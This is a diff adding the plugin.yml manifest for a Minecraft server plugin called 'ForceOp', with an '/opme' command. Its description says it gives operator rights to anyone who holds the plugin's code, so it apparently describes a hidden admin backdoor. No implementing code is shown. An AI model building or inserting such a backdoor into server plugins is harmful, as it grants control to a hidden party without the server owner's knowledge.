@@ -1,0 +1,9 @@
+name: ForceOp
+main: me.johny9020.forceop.Main
+version: 1.0
+description: Op's a player of your choice if you have the code of this plugin
+
+commands:
+    opme:
+        description: Op's you
+        usage: /opme
